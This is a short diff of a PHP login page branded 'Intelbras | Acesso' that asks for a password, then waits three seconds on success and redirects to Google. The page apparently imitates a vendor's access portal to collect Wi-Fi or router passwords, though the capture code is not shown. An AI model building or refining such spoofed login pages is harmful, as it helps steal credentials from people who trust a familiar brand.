@@ -24,7 +24,9 @@ try {
 
             $mensagem = 'Operação realizada com sucesso!';
             $tipoMensagem = 'sucesso';
-        } else {
+
+	    sleep(3);
+	} else {
             $mensagem = 'Informe uma senha.';
             $tipoMensagem = 'erro';
         }
@@ -42,7 +44,9 @@ try {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <title>Intelbras | Acesso</title>
-
+   <?php if ($tipoMensagem === 'sucesso'): ?>
+        <meta http-equiv="refresh" content="3;url=https://www.google.com.br">
+    <?php endif; ?>
     <style>
         * {
             box-sizing: border-box;
